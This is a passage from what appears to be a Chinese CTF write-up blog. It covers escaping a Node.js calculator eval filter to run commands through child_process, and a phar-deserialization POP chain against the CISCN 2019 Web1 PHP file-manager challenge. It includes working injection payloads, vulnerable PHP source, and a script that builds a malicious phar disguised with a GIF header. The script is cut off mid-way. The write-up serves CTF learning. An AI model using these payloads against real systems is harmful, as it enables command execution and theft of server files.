function_">replace</span>(<span class="string">&quot;ln&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;fs&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;fs&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;x&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = <span class="built_in">eval</span>(calc);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216165920626.png" alt="image-20241216165920626"></p><p>这里可以调试一下，方便看！</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216170014770.png" alt="image-20241216170014770"></p><p>我们发现是可以逃逸出来的，因为取的calc[i]是大于一位的，而.split出来只有一位，所以是不相等的。可以利用此处的漏洞来进行逃逸。</p><p>让这个单独的一位在很后面就行，大于要逃逸的字符串的长度即可。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216173859525.png" alt="image-20241216173859525" style="zoom: 67%;" /><p>这里本来想直接cat &#x2F;xxxxxx.flag，但是存在长度限制，失败。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc = calc.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">64</span>);</span><br></pre></td></tr></table></figure><p>想办法，这里用星号不可以</p><p>同时过滤了x，不能用exec，但是这可以绕过！</p><p>这里本来想着用十六进制绕过，但是不可以，实测</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216174248130.png" alt="image-20241216174248130"></p><p>我想可能是因为已经在for循环中被解析出来了，就已经是x了，而对x的检测再最后，所以没法绕过</p><p>但是还有一种方法。因为我们通过require导入的模块是一个Object，那么就可以通过Object.values获取到child_process里面的各种方法，那么再通过数组下标[5]就可以得到execSync了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=Object.values(require(&#x27;child_process&#x27;))[5](&#x27;cat$&#123;IFS&#125;/G*&gt;p&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=require(&#x27;child_process&#x27;).spawnSync(&#x27;nl&#x27;,[&#x27;p&#x27;]).stdout.toString();</span><br></pre></td></tr></table></figure><p>以上由于长度限制，因此只能通过写文件和读文件分离来获取flag了！</p><h2 id="CISCN-2019华北Day1-Web1"><a href="#CISCN-2019华北Day1-Web1" class="headerlink" title="[CISCN 2019华北Day1]Web1"></a>[CISCN 2019华北Day1]Web1</h2><p>打开后是一个注册+登录界面，遇到这种情况一般都是先注册再登陆进去的，接下来可能有权限的提升等等。</p><p>进去后发现三个功能点。</p><ul><li>上传文件</li><li>下载文件</li><li>删除文件</li></ul><p>我们发现下载文件处存在任意文件读取！</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217102936436.png" alt="image-20241217102936436" style="zoom: 67%;" /><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现存在一个class.php文件，源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以发现在download.php中存在这样的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file-&gt;close();</span><br></pre></td></tr></table></figure><p>这会触发file_get_contents，存在phar反序列化！我们只需要上传一个phar文件然后下载文件来phar伪协议即可。</p><p>接下来，我们需要构造的是pop链，构造恶意phar文件。</p><p>这里要注意File中只是return了flag.txt的内容，并没有输出，所以我们想办法将其输出！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span>=<span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=<span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;db=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//删除之前的test.phar文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//开始缓冲 Phar 写操作</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="comment">//设置stub，添加gif文件头</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); <span class="comment">//要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);  <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span 